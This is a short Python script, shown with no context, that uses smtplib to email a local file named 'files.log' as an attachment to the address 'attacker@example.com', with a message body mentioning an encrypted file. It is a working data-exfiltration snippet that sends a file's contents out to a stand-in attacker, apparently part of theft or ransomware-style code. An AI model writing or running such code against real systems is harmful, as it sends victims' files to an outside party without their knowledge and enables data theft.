import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg["Subject"] = "Report"
msg["From"] = "you@example.com"
msg["To"] = "attacker@example.com"
msg.set_content("Attached is the encrypted file.")
with open("files.log", "rb") as f:
    msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="files.log")

with smtplib.SMTP("localhost") as s:
    s.send_message(msg)
